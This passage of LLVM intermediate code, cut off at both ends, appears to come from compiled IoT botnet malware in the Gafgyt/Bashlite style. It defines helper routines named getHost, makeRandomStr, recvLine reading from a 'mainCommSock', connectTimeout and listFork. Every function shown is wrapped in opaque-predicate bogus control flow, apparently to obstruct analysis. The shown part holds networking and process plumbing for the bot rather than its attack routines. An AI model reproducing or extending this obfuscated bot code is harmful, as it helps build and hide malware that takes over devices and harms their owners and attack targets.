  %5 = alloca %struct.in_addr*, align 8
  %6 = alloca %struct.hostent*, align 8
  store i8* %0, i8** %4, align 8
  store %struct.in_addr* %1, %struct.in_addr** %5, align 8
  %7 = load i8*, i8** %4, align 8
  %8 = call i32 @inet_addr(i8* %7) #6
  %9 = load %struct.in_addr*, %struct.in_addr** %5, align 8
  %10 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %9, i32 0, i32 0
  store i32 %8, i32* %10, align 4
  %11 = icmp eq i32 %8, -1
  br i1 %11, label %12, label %13

; <label>:12:                                     ; preds = %2
  store i32 1, i32* %3, align 4
  br label %30

; <label>:13:                                     ; preds = %2
  %14 = load i32, i32* @x.21
  %15 = load i32, i32* @y.22
  %16 = sub i32 %14, 1
  %17 = mul i32 %14, %16
  %18 = urem i32 %17, 2
  %19 = icmp eq i32 %18, 0
  %20 = icmp slt i32 %15, 10
  %21 = or i1 %19, %20
  br i1 %21, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %13
  store i32 0, i32* %3, align 4
  %22 = load i32, i32* @x.21
  %23 = load i32, i32* @y.22
  %24 = sub i32 %22, 1
  %25 = mul i32 %22, %24
  %26 = urem i32 %25, 2
  %27 = icmp eq i32 %26, 0
  %28 = icmp slt i32 %23, 10
  %29 = or i1 %27, %28
  br i1 %29, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %30

; <label>:30:                                     ; preds = %originalBBpart2, %12
  %31 = load i32, i32* @x.21
  %32 = load i32, i32* @y.22
  %33 = sub i32 %31, 1
  %34 = mul i32 %31, %33
  %35 = urem i32 %34, 2
  %36 = icmp eq i32 %35, 0
  %37 = icmp slt i32 %32, 10
  %38 = or i1 %36, %37
  br i1 %38, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %30
  %39 = load i32, i32* %3, align 4
  %40 = load i32, i32* @x.21
  %41 = load i32, i32* @y.22
  %42 = sub i32 %40, 1
  %43 = mul i32 %40, %42
  %44 = urem i32 %43, 2
  %45 = icmp eq i32 %44, 0
  %46 = icmp slt i32 %41, 10
  %47 = or i1 %45, %46
  br i1 %47, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  ret i32 %39

originalBBalteredBB:                              ; preds = %originalBB, %13
  store i32 0, i32* %3, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %30
  %48 = load i32, i32* %3, align 4
  br label %originalBB1
}

; Function Attrs: noinline nounwind uwtable
define void @makeRandomStr(i8*, i32) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  store i32 0, i32* %5, align 4
  store i32 0, i32* %5, align 4
  br label %6

; <label>:6:                                      ; preds = %35, %2
  %7 = load i32, i32* @x.23
  %8 = load i32, i32* @y.24
  %9 = sub i32 %7, 1
  %10 = mul i32 %7, %9
  %11 = urem i32 %10, 2
  %12 = icmp eq i32 %11, 0
  %13 = icmp slt i32 %8, 10
  %14 = or i1 %12, %13
  br i1 %14, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %6
  %15 = load i32, i32* %5, align 4
  %16 = load i32, i32* %4, align 4
  %17 = icmp slt i32 %15, %16
  %18 = load i32, i32* @x.23
  %19 = load i32, i32* @y.24
  %20 = sub i32 %18, 1
  %21 = mul i32 %18, %20
  %22 = urem i32 %21, 2
  %23 = icmp eq i32 %22, 0
  %24 = icmp slt i32 %19, 10
  %25 = or i1 %23, %24
  br i1 %25, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %17, label %26, label %38

; <label>:26:                                     ; preds = %originalBBpart2
  %27 = call i32 @rand_cmwc()
  %28 = urem i32 %27, 26
  %29 = add i32 %28, 65
  %30 = trunc i32 %29 to i8
  %31 = load i8*, i8** %3, align 8
  %32 = load i32, i32* %5, align 4
  %33 = sext i32 %32 to i64
  %34 = getelementptr inbounds i8, i8* %31, i64 %33
  store i8 %30, i8* %34, align 1
  br label %35

; <label>:35:                                     ; preds = %26
  %36 = load i32, i32* %5, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %5, align 4
  br label %6

; <label>:38:                                     ; preds = %originalBBpart2
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %6
  %39 = load i32, i32* %5, align 4
  %40 = load i32, i32* %4, align 4
  %41 = icmp slt i32 %39, %40
  br label %originalBB
}

; Function Attrs: noinline nounwind uwtable
define i32 @recvLine(i32, i8*, i32) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca %struct.fd_set, align 8
  %9 = alloca %struct.timeval, align 8
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i32, align 4
  %16 = alloca i8, align 1
  %17 = alloca i8*, align 8
  %18 = alloca i32, align 4
  store i32 %0, i32* %5, align 4
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %19 = load i8*, i8** %6, align 8
  %20 = load i32, i32* %7, align 4
  %21 = sext i32 %20 to i64
  call void @llvm.memset.p0i8.i64(i8* %19, i8 0, i64 %21, i32 1, i1 false)
  %22 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %22, align 8
  %23 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %23, align 8
  br label %24

; <label>:24:                                     ; preds = %3
  %25 = load i32, i32* @x.25
  %26 = load i32, i32* @y.26
  %27 = sub i32 %25, 1
  %28 = mul i32 %25, %27
  %29 = urem i32 %28, 2
  %30 = icmp eq i32 %29, 0
  %31 = icmp slt i32 %26, 10
  %32 = or i1 %30, %31
  br i1 %32, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %24
  %33 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %34 = getelementptr inbounds [16 x i64], [16 x i64]* %33, i64 0, i64 0
  %35 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %34) #6, !srcloc !1
  %36 = extractvalue { i64, i64* } %35, 0
  %37 = extractvalue { i64, i64* } %35, 1
  %38 = trunc i64 %36 to i32
  store i32 %38, i32* %10, align 4
  %39 = ptrtoint i64* %37 to i64
  %40 = trunc i64 %39 to i32
  store i32 %40, i32* %11, align 4
  %41 = load i32, i32* @x.25
  %42 = load i32, i32* @y.26
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %49

; <label>:49:                                     ; preds = %originalBBpart2
  %50 = load i32, i32* %5, align 4
  %51 = srem i32 %50, 64
  %52 = zext i32 %51 to i64
  %53 = shl i64 1, %52
  %54 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %55 = load i32, i32* %5, align 4
  %56 = sdiv i32 %55, 64
  %57 = sext i32 %56 to i64
  %58 = getelementptr inbounds [16 x i64], [16 x i64]* %54, i64 0, i64 %57
  %59 = load i64, i64* %58, align 8
  %60 = or i64 %59, %53
  store i64 %60, i64* %58, align 8
  %61 = load i32, i32* %5, align 4
  %62 = add nsw i32 %61, 1
  %63 = call i32 @select(i32 %62, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %63, i32* %12, align 4
  %64 = icmp sle i32 %63, 0
  br i1 %64, label %65, label %134

; <label>:65:                                     ; preds = %49
  br label %66

; <label>:66:                                     ; preds = %originalBBpart217, %65
  %67 = load i32, i32* %13, align 4
  %68 = icmp slt i32 %67, 10
  br i1 %68, label %69, label %133

; <label>:69:                                     ; preds = %66
  %70 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 0
  store i64 30, i64* %70, align 8
  %71 = getelementptr inbounds %struct.timeval, %struct.timeval* %9, i32 0, i32 1
  store i64 0, i64* %71, align 8
  br label %72

; <label>:72:                                     ; preds = %69
  %73 = load i32, i32* @x.25
  %74 = load i32, i32* @y.26
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %72
  %81 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %82 = getelementptr inbounds [16 x i64], [16 x i64]* %81, i64 0, i64 0
  %83 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %82) #6, !srcloc !2
  %84 = extractvalue { i64, i64* } %83, 0
  %85 = extractvalue { i64, i64* } %83, 1
  %86 = trunc i64 %84 to i32
  store i32 %86, i32* %14, align 4
  %87 = ptrtoint i64* %85 to i64
  %88 = trunc i64 %87 to i32
  store i32 %88, i32* %15, align 4
  %89 = load i32, i32* @x.25
  %90 = load i32, i32* @y.26
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %97

; <label>:97:                                     ; preds = %originalBBpart24
  %98 = load i32, i32* %5, align 4
  %99 = srem i32 %98, 64
  %100 = zext i32 %99 to i64
  %101 = shl i64 1, %100
  %102 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %103 = load i32, i32* %5, align 4
  %104 = sdiv i32 %103, 64
  %105 = sext i32 %104 to i64
  %106 = getelementptr inbounds [16 x i64], [16 x i64]* %102, i64 0, i64 %105
  %107 = load i64, i64* %106, align 8
  %108 = or i64 %107, %101
  store i64 %108, i64* %106, align 8
  %109 = load i32, i32* %5, align 4
  %110 = add nsw i32 %109, 1
  %111 = call i32 @select(i32 %110, %struct.fd_set* %8, %struct.fd_set* null, %struct.fd_set* %8, %struct.timeval* %9)
  store i32 %111, i32* %12, align 4
  %112 = icmp sle i32 %111, 0
  br i1 %112, label %113, label %132

; <label>:113:                                    ; preds = %97
  %114 = load i32, i32* @x.25
  %115 = load i32, i32* @y.26
  %116 = sub i32 %114, 1
  %117 = mul i32 %114, %116
  %118 = urem i32 %117, 2
  %119 = icmp eq i32 %118, 0
  %120 = icmp slt i32 %115, 10
  %121 = or i1 %119, %120
  br i1 %121, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %113
  %122 = load i32, i32* %13, align 4
  %123 = add nsw i32 %122, 1
  store i32 %123, i32* %13, align 4
  %124 = load i32, i32* @x.25
  %125 = load i32, i32* @y.26
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart217, label %originalBB6alteredBB

originalBBpart217:                                ; preds = %originalBB6
  br label %66

; <label>:132:                                    ; preds = %97
  br label %133

; <label>:133:                                    ; preds = %132, %66
  br label %134

; <label>:134:                                    ; preds = %133, %49
  store i32 0, i32* %18, align 4
  %135 = load i8*, i8** %6, align 8
  store i8* %135, i8** %17, align 8
  br label %136

; <label>:136:                                    ; preds = %170, %134
  %137 = load i32, i32* %7, align 4
  %138 = add nsw i32 %137, -1
  store i32 %138, i32* %7, align 4
  %139 = icmp sgt i32 %137, 1
  br i1 %139, label %140, label %173

; <label>:140:                                    ; preds = %136
  %141 = load i32, i32* @mainCommSock, align 4
  %142 = call i64 @recv(i32 %141, i8* %16, i64 1, i32 0)
  %143 = icmp ne i64 %142, 1
  br i1 %143, label %144, label %146

; <label>:144:                                    ; preds = %140
  %145 = load i8*, i8** %17, align 8
  store i8 0, i8* %145, align 1
  store i32 -1, i32* %4, align 4
  br label %192

; <label>:146:                                    ; preds = %140
  %147 = load i32, i32* @x.25
  %148 = load i32, i32* @y.26
  %149 = sub i32 %147, 1
  %150 = mul i32 %147, %149
  %151 = urem i32 %150, 2
  %152 = icmp eq i32 %151, 0
  %153 = icmp slt i32 %148, 10
  %154 = or i1 %152, %153
  br i1 %154, label %originalBB19, label %originalBB19alteredBB

originalBB19:                                     ; preds = %originalBB19alteredBB, %146
  %155 = load i8, i8* %16, align 1
  %156 = load i8*, i8** %17, align 8
  %157 = getelementptr inbounds i8, i8* %156, i32 1
  store i8* %157, i8** %17, align 8
  store i8 %155, i8* %156, align 1
  %158 = load i8, i8* %16, align 1
  %159 = zext i8 %158 to i32
  %160 = icmp eq i32 %159, 10
  %161 = load i32, i32* @x.25
  %162 = load i32, i32* @y.26
  %163 = sub i32 %161, 1
  %164 = mul i32 %161, %163
  %165 = urem i32 %164, 2
  %166 = icmp eq i32 %165, 0
  %167 = icmp slt i32 %162, 10
  %168 = or i1 %166, %167
  br i1 %168, label %originalBBpart221, label %originalBB19alteredBB

originalBBpart221:                                ; preds = %originalBB19
  br i1 %160, label %169, label %170

; <label>:169:                                    ; preds = %originalBBpart221
  br label %173

; <label>:170:                                    ; preds = %originalBBpart221
  %171 = load i32, i32* %18, align 4
  %172 = add nsw i32 %171, 1
  store i32 %172, i32* %18, align 4
  br label %136

; <label>:173:                                    ; preds = %169, %136
  %174 = load i32, i32* @x.25
  %175 = load i32, i32* @y.26
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBB23, label %originalBB23alteredBB

originalBB23:                                     ; preds = %originalBB23alteredBB, %173
  %182 = load i8*, i8** %17, align 8
  store i8 0, i8* %182, align 1
  %183 = load i32, i32* %18, align 4
  store i32 %183, i32* %4, align 4
  %184 = load i32, i32* @x.25
  %185 = load i32, i32* @y.26
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart225, label %originalBB23alteredBB

originalBBpart225:                                ; preds = %originalBB23
  br label %192

; <label>:192:                                    ; preds = %originalBBpart225, %144
  %193 = load i32, i32* %4, align 4
  ret i32 %193

originalBBalteredBB:                              ; preds = %originalBB, %24
  %194 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %195 = getelementptr inbounds [16 x i64], [16 x i64]* %194, i64 0, i64 0
  %196 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %195) #6, !srcloc !1
  %197 = extractvalue { i64, i64* } %196, 0
  %198 = extractvalue { i64, i64* } %196, 1
  %199 = trunc i64 %197 to i32
  store i32 %199, i32* %10, align 4
  %200 = ptrtoint i64* %198 to i64
  %201 = trunc i64 %200 to i32
  store i32 %201, i32* %11, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %72
  %202 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %8, i32 0, i32 0
  %203 = getelementptr inbounds [16 x i64], [16 x i64]* %202, i64 0, i64 0
  %204 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %203) #6, !srcloc !2
  %205 = extractvalue { i64, i64* } %204, 0
  %206 = extractvalue { i64, i64* } %204, 1
  %207 = trunc i64 %205 to i32
  store i32 %207, i32* %14, align 4
  %208 = ptrtoint i64* %206 to i64
  %209 = trunc i64 %208 to i32
  store i32 %209, i32* %15, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %113
  %210 = load i32, i32* %13, align 4
  %_ = shl i32 %210, 1
  %_7 = sub i32 0, %210
  %gen = add i32 %_7, 1
  %_8 = sub i32 %210, 1
  %gen9 = mul i32 %_8, 1
  %_10 = sub i32 0, %210
  %gen11 = add i32 %_10, 1
  %_12 = sub i32 %210, 1
  %gen13 = mul i32 %_12, 1
  %_14 = sub i32 %210, 1
  %gen15 = mul i32 %_14, 1
  %211 = add nsw i32 %210, 1
  store i32 %211, i32* %13, align 4
  br label %originalBB6

originalBB19alteredBB:                            ; preds = %originalBB19, %146
  %212 = load i8, i8* %16, align 1
  %213 = load i8*, i8** %17, align 8
  %214 = getelementptr inbounds i8, i8* %213, i32 1
  store i8* %214, i8** %17, align 8
  store i8 %212, i8* %213, align 1
  %215 = load i8, i8* %16, align 1
  %216 = zext i8 %215 to i32
  %217 = icmp eq i32 %216, 10
  br label %originalBB19

originalBB23alteredBB:                            ; preds = %originalBB23, %173
  %218 = load i8*, i8** %17, align 8
  store i8 0, i8* %218, align 1
  %219 = load i32, i32* %18, align 4
  store i32 %219, i32* %4, align 4
  br label %originalBB23
}

declare i32 @select(i32, %struct.fd_set*, %struct.fd_set*, %struct.fd_set*, %struct.timeval*) #2

declare i64 @recv(i32, i8*, i64, i32) #2

; Function Attrs: noinline nounwind uwtable
define i32 @connectTimeout(i32, i8*, i32, i32) #0 {
  %5 = load i32, i32* @x.27
  %6 = load i32, i32* @y.28
  %7 = sub i32 %5, 1
  %8 = mul i32 %5, %7
  %9 = urem i32 %8, 2
  %10 = icmp eq i32 %9, 0
  %11 = icmp slt i32 %6, 10
  %12 = or i1 %10, %11
  br i1 %12, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %4
  %13 = alloca i32, align 4
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i32, align 4
  %17 = alloca i32, align 4
  %18 = alloca %struct.sockaddr_in, align 4
  %19 = alloca %struct.fd_set, align 8
  %20 = alloca %struct.timeval, align 8
  %21 = alloca i32, align 4
  %22 = alloca i32, align 4
  %23 = alloca i64, align 8
  %24 = alloca i32, align 4
  %25 = alloca i32, align 4
  %26 = alloca i32, align 4
  store i32 %0, i32* %14, align 4
  store i8* %1, i8** %15, align 8
  store i32 %2, i32* %16, align 4
  store i32 %3, i32* %17, align 4
  %27 = load i32, i32* %14, align 4
  %28 = call i32 (i32, i32, ...) @fcntl(i32 %27, i32 3, i8* null)
  %29 = sext i32 %28 to i64
  store i64 %29, i64* %23, align 8
  %30 = load i64, i64* %23, align 8
  %31 = or i64 %30, 2048
  store i64 %31, i64* %23, align 8
  %32 = load i32, i32* %14, align 4
  %33 = load i64, i64* %23, align 8
  %34 = call i32 (i32, i32, ...) @fcntl(i32 %32, i32 4, i64 %33)
  %35 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 0
  store i16 2, i16* %35, align 4
  %36 = load i32, i32* %16, align 4
  %37 = trunc i32 %36 to i16
  %38 = call zeroext i16 @htons(i16 zeroext %37) #9
  %39 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 1
  store i16 %38, i16* %39, align 2
  %40 = load i8*, i8** %15, align 8
  %41 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 2
  %42 = call i32 @getHost(i8* %40, %struct.in_addr* %41)
  %43 = icmp ne i32 %42, 0
  %44 = load i32, i32* @x.27
  %45 = load i32, i32* @y.28
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %43, label %52, label %53

; <label>:52:                                     ; preds = %originalBBpart2
  store i32 0, i32* %13, align 4
  br label %148

; <label>:53:                                     ; preds = %originalBBpart2
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %18, i32 0, i32 3
  %55 = getelementptr inbounds [8 x i8], [8 x i8]* %54, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %55, i8 0, i64 8, i32 4, i1 false)
  %56 = load i32, i32* %14, align 4
  %57 = bitcast %struct.sockaddr_in* %18 to %struct.sockaddr*
  %58 = call i32 @connect(i32 %56, %struct.sockaddr* %57, i32 16)
  store i32 %58, i32* %24, align 4
  %59 = load i32, i32* %24, align 4
  %60 = icmp slt i32 %59, 0
  br i1 %60, label %61, label %139

; <label>:61:                                     ; preds = %53
  %62 = load i32, i32* @x.27
  %63 = load i32, i32* @y.28
  %64 = sub i32 %62, 1
  %65 = mul i32 %62, %64
  %66 = urem i32 %65, 2
  %67 = icmp eq i32 %66, 0
  %68 = icmp slt i32 %63, 10
  %69 = or i1 %67, %68
  br i1 %69, label %originalBB11, label %originalBB11alteredBB

originalBB11:                                     ; preds = %originalBB11alteredBB, %61
  %70 = call i32* @__errno_location() #9
  %71 = load i32, i32* %70, align 4
  %72 = icmp eq i32 %71, 115
  %73 = load i32, i32* @x.27
  %74 = load i32, i32* @y.28
  %75 = sub i32 %73, 1
  %76 = mul i32 %73, %75
  %77 = urem i32 %76, 2
  %78 = icmp eq i32 %77, 0
  %79 = icmp slt i32 %74, 10
  %80 = or i1 %78, %79
  br i1 %80, label %originalBBpart213, label %originalBB11alteredBB

originalBBpart213:                                ; preds = %originalBB11
  br i1 %72, label %81, label %137

; <label>:81:                                     ; preds = %originalBBpart213
  %82 = load i32, i32* %17, align 4
  %83 = sext i32 %82 to i64
  %84 = getelementptr inbounds %struct.timeval, %struct.timeval* %20, i32 0, i32 0
  store i64 %83, i64* %84, align 8
  %85 = getelementptr inbounds %struct.timeval, %struct.timeval* %20, i32 0, i32 1
  store i64 0, i64* %85, align 8
  br label %86

; <label>:86:                                     ; preds = %81
  %87 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %19, i32 0, i32 0
  %88 = getelementptr inbounds [16 x i64], [16 x i64]* %87, i64 0, i64 0
  %89 = call { i64, i64* } asm sideeffect "cld; rep; stosq", "={cx},={di},{ax},0,1,~{memory},~{dirflag},~{fpsr},~{flags}"(i32 0, i64 16, i64* %88) #6, !srcloc !3
  %90 = extractvalue { i64, i64* } %89, 0
  %91 = extractvalue { i64, i64* } %89, 1
  %92 = trunc i64 %90 to i32
  store i32 %92, i32* %25, align 4
  %93 = ptrtoint i64* %91 to i64
  %94 = trunc i64 %93 to i32
  store i32 %94, i32* %26, align 4
  br label %95

; <label>:95:                                     ; preds = %86
  %96 = load i32, i32* %14, align 4
  %97 = srem i32 %96, 64
  %98 = zext i32 %97 to i64
  %99 = shl i64 1, %98
  %100 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %19, i32 0, i32 0
  %101 = load i32, i32* %14, align 4
  %102 = sdiv i32 %101, 64
  %103 = sext i32 %102 to i64
  %104 = getelementptr inbounds [16 x i64], [16 x i64]* %100, i64 0, i64 %103
  %105 = load i64, i64* %104, align 8
  %106 = or i64 %105, %99
  store i64 %106, i64* %104, align 8
  %107 = load i32, i32* %14, align 4
  %108 = add nsw i32 %107, 1
  %109 = call i32 @select(i32 %108, %struct.fd_set* null, %struct.fd_set* %19, %struct.fd_set* null, %struct.timeval* %20)
  %110 = icmp sgt i32 %109, 0
  br i1 %110, label %111, label %119

; <label>:111:                                    ; preds = %95
  store i32 4, i32* %21, align 4
  %112 = load i32, i32* %14, align 4
  %113 = bitcast i32* %22 to i8*
  %114 = call i32 @getsockopt(i32 %112, i32 1, i32 4, i8* %113, i32* %21) #6
  %115 = load i32, i32* %22, align 4
  %116 = icmp ne i32 %115, 0
  br i1 %116, label %117, label %118

; <label>:117:                                    ; preds = %111
  store i32 0, i32* %13, align 4
  br label %148

; <label>:118:                                    ; preds = %111
  br label %136

; <label>:119:                                    ; preds = %95
  %120 = load i32, i32* @x.27
  %121 = load i32, i32* @y.28
  %122 = sub i32 %120, 1
  %123 = mul i32 %120, %122
  %124 = urem i32 %123, 2
  %125 = icmp eq i32 %124, 0
  %126 = icmp slt i32 %121, 10
  %127 = or i1 %125, %126
  br i1 %127, label %originalBB15, label %originalBB15alteredBB

originalBB15:                                     ; preds = %originalBB15alteredBB, %119
  store i32 0, i32* %13, align 4
  %128 = load i32, i32* @x.27
  %129 = load i32, i32* @y.28
  %130 = sub i32 %128, 1
  %131 = mul i32 %128, %130
  %132 = urem i32 %131, 2
  %133 = icmp eq i32 %132, 0
  %134 = icmp slt i32 %129, 10
  %135 = or i1 %133, %134
  br i1 %135, label %originalBBpart217, label %originalBB15alteredBB

originalBBpart217:                                ; preds = %originalBB15
  br label %148

; <label>:136:                                    ; preds = %118
  br label %138

; <label>:137:                                    ; preds = %originalBBpart213
  store i32 0, i32* %13, align 4
  br label %148

; <label>:138:                                    ; preds = %136
  br label %139

; <label>:139:                                    ; preds = %138, %53
  %140 = load i32, i32* %14, align 4
  %141 = call i32 (i32, i32, ...) @fcntl(i32 %140, i32 3, i8* null)
  %142 = sext i32 %141 to i64
  store i64 %142, i64* %23, align 8
  %143 = load i64, i64* %23, align 8
  %144 = and i64 %143, -2049
  store i64 %144, i64* %23, align 8
  %145 = load i32, i32* %14, align 4
  %146 = load i64, i64* %23, align 8
  %147 = call i32 (i32, i32, ...) @fcntl(i32 %145, i32 4, i64 %146)
  store i32 1, i32* %13, align 4
  br label %148

; <label>:148:                                    ; preds = %139, %137, %originalBBpart217, %117, %52
  %149 = load i32, i32* %13, align 4
  ret i32 %149

originalBBalteredBB:                              ; preds = %originalBB, %4
  %150 = alloca i32, align 4
  %151 = alloca i32, align 4
  %152 = alloca i8*, align 8
  %153 = alloca i32, align 4
  %154 = alloca i32, align 4
  %155 = alloca %struct.sockaddr_in, align 4
  %156 = alloca %struct.fd_set, align 8
  %157 = alloca %struct.timeval, align 8
  %158 = alloca i32, align 4
  %159 = alloca i32, align 4
  %160 = alloca i64, align 8
  %161 = alloca i32, align 4
  %162 = alloca i32, align 4
  %163 = alloca i32, align 4
  store i32 %0, i32* %151, align 4
  store i8* %1, i8** %152, align 8
  store i32 %2, i32* %153, align 4
  store i32 %3, i32* %154, align 4
  %164 = load i32, i32* %151, align 4
  %165 = call i32 (i32, i32, ...) @fcntl(i32 %164, i32 3, i8* null)
  %166 = sext i32 %165 to i64
  store i64 %166, i64* %160, align 8
  %167 = load i64, i64* %160, align 8
  %_ = sub i64 0, %167
  %gen = add i64 %_, 2048
  %_1 = sub i64 0, %167
  %gen2 = add i64 %_1, 2048
  %_3 = sub i64 %167, 2048
  %gen4 = mul i64 %_3, 2048
  %_5 = shl i64 %167, 2048
  %_6 = sub i64 0, %167
  %gen7 = add i64 %_6, 2048
  %_8 = shl i64 %167, 2048
  %_9 = sub i64 0, %167
  %gen10 = add i64 %_9, 2048
  %168 = or i64 %167, 2048
  store i64 %168, i64* %160, align 8
  %169 = load i32, i32* %151, align 4
  %170 = load i64, i64* %160, align 8
  %171 = call i32 (i32, i32, ...) @fcntl(i32 %169, i32 4, i64 %170)
  %172 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %155, i32 0, i32 0
  store i16 2, i16* %172, align 4
  %173 = load i32, i32* %153, align 4
  %174 = trunc i32 %173 to i16
  %175 = call zeroext i16 @htons(i16 zeroext %174) #9
  %176 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %155, i32 0, i32 1
  store i16 %175, i16* %176, align 2
  %177 = load i8*, i8** %152, align 8
  %178 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %155, i32 0, i32 2
  %179 = call i32 @getHost(i8* %177, %struct.in_addr* %178)
  %180 = icmp ne i32 %179, 0
  br label %originalBB

originalBB11alteredBB:                            ; preds = %originalBB11, %61
  %181 = call i32* @__errno_location() #9
  %182 = load i32, i32* %181, align 4
  %183 = icmp eq i32 %182, 115
  br label %originalBB11

originalBB15alteredBB:                            ; preds = %originalBB15, %119
  store i32 0, i32* %13, align 4
  br label %originalBB15
}

declare i32 @fcntl(i32, i32, ...) #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() #1

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) #3

; Function Attrs: noinline nounwind uwtable
define i32 @listFork() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32*, align 8
  %4 = alloca i32, align 4
  %5 = call i32 @fork() #6
  store i32 %5, i32* %2, align 4
  %6 = load i32, i32* %2, align 4
  %7 = icmp ule i32 %6, 0
  br i1 %7, label %8, label %10

; <label>:8:                                      ; preds = %0
  %9 = load i32, i32* %2, align 4
  store i32 %9, i32* %1, align 4
  br label %47

; <label>:10:                                     ; preds = %0
  %11 = load i64, i64* @numpids, align 8
  %12 = add i64 %11, 1
  store i64 %12, i64* @numpids, align 8
  %13 = load i64, i64* @numpids, align 8
  %14 = add i64 %13, 1
  %15 = mul i64 %14, 4
  %16 = call noalias i8* @malloc(i64 %15) #6
  %17 = bitcast i8* %16 to i32*
  store i32* %17, i32** %3, align 8
  store i32 0, i32* %4, align 4
